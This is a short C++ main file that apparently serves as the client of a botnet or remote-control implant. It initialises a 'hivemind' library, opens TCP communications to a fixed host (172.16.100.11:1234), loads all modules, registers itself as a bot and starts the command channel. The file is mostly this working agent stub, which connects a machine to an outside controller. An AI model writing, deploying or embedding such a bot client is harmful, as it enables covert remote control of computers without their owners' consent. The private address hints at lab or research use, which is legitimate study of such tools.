#include "hivemind.h"

int main() {
  hivemind_lib::Init();
  hivemind_lib::UseTcp();
  hivemind_lib::InitComms("172.16.100.11", "1234");
  hivemind_lib::AddModule(hivemind_lib::ALL);
  hivemind_lib::RegisterBot();
  hivemind_lib::BeginComms();
  return 0;
}